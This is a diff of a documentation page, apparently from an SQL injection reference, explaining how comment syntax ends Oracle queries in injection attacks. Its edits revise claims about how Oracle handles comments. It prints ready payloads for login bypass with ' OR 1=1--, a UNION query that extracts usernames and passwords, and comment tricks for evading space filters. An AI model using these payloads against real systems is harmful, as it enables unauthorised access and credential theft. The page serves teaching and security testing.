@@ -4,14 +4,14 @@ description: How to comment out queries in Oracle Database
 category: Basics
 order: 2
 tags: ["basics", "syntax", "comments"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 When performing SQL injection attacks against Oracle databases, commenting out the remainder of a query is often necessary to ensure that the injection payload works correctly without syntax errors. Oracle provides specific syntaxes for commenting.
 
 ## Oracle Comment Syntax
 
-Oracle supports two primary methods for commenting out query parts:
+Oracle supports two methods for commenting out query parts:
 
 | Comment Type        | Syntax      | Description                                    |
 | ------------------- | ----------- | ---------------------------------------------- |
@@ -26,16 +26,11 @@ The double dash `--` is the most common way to comment out the rest of a query i
 SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'something'
 ```
 
-**Important**: In Oracle, the double dash must be followed by a space or line terminator to be recognized as a comment.
+Unlike MySQL, Oracle does not need a space after the double dash:
 
 ```sql
--- Correct:
+-- Both are valid and return the admin row
 SELECT * FROM users WHERE username = 'admin'-- AND password = 'test'
-
--- Also correct:
-SELECT * FROM users WHERE username = 'admin'--  AND password = 'test'
-
--- Incorrect (no space after --):
 SELECT * FROM users WHERE username = 'admin'--AND password = 'test'
 ```
 
@@ -50,7 +45,7 @@ SELECT * FROM users WHERE username = 'admin'/* AND password = 'something' */
 Block comments are useful when you need to comment out code in the middle of a statement:
 
 ```sql
-SELECT user_id, username /* , password */ FROM users
+SELECT id, username /* , password */ FROM users
 ```
 
 ## Examples in SQL Injection Context
@@ -65,30 +60,30 @@ SELECT * FROM users WHERE username = 'input1' AND password = 'input2'
 ' OR 1=1--
 
 -- Resulting query:
-SELECT * FROM users WHERE username = '' OR 1=1--  ' AND password = 'input2'
+SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'input2'
 ```
 
 ### UNION Attack
 
 ```sql
--- Original query:
-SELECT article_id, title, content FROM articles WHERE article_id = 'input'
+-- Original query (numeric parameter, three columns):
+SELECT id, title, content FROM articles WHERE id = input
 
 -- Injection with comment:
--1 UNION SELECT username, password, null FROM users--
+-1 UNION SELECT NULL, username, password FROM users--
 
 -- Resulting query:
-SELECT article_id, title, content FROM articles WHERE article_id = -1 UNION SELECT username, password, null FROM users--
+SELECT id, title, content FROM articles WHERE id = -1 UNION SELECT NULL, username, password FROM users--
 ```
 
 ## Oracle-Specific Notes
 
 Unlike some other database systems, Oracle:
 
-1. Does not support the hash (`#`) comment syntax
-2. Requires a space after the double dash (`--`)
-3. Does not support the MySQL-style `-- -` comment syntax
-4. Allows nested block comments `/* outer /* inner */ outer */`
+1. Does not support the hash (`#`) comment syntax (`ORA-00911: invalid character`)
+2. Does not require a space after the double dash, so `--` and the MySQL-style `-- -` both work
+3. Does not support nested block comments: in `/* outer /* inner */ outer */` the comment ends at the first `*/`
+4. Ends a `--` comment only at a line feed (`%0A`): a carriage return (`%0D`) stays inside the comment, unlike PostgreSQL and SQL Server
 
 ## Practical Applications
 
@@ -98,27 +93,26 @@ For complex queries with multiple conditions, commenting is essential:
 
 ```sql
 -- Original query with multiple WHERE conditions
-SELECT * FROM products WHERE category_id = 'input' AND active = 1 AND price > 0
+SELECT * FROM products WHERE category = 'input' AND price > 0 AND id < 100
 
 -- Injection with comment to bypass additional conditions
 ' OR 1=1--
 
 -- Resulting query
-SELECT * FROM products WHERE category_id = '' OR 1=1--  ' AND active = 1 AND price > 0
+SELECT * FROM products WHERE category = '' OR 1=1--' AND price > 0 AND id < 100
 ```
 
-### Bypassing Quote Filters
+### Replacing Spaces
 
-If single quotes are filtered, you might be able to use comment handling:
+If spaces are filtered, an empty block comment separates keywords just as well:
 
 ```sql
--- Using comments to build the payload without quotes
-SELECT/**/username/**/FROM/**/users/**/WHERE/**/user_id=1--
+SELECT/**/username/**/FROM/**/users/**/WHERE/**/id=1--
 ```
 
-### Multi-Line Statement Handling
+### Multi-Line Payloads
 
-Oracle's PL/SQL blocks can be complicated, and sometimes you need block comments:
+A block comment can absorb line breaks in the rest of the query, and `--` then ends whatever is left on the last line:
 
 ```sql
 ' OR 1=1 /*
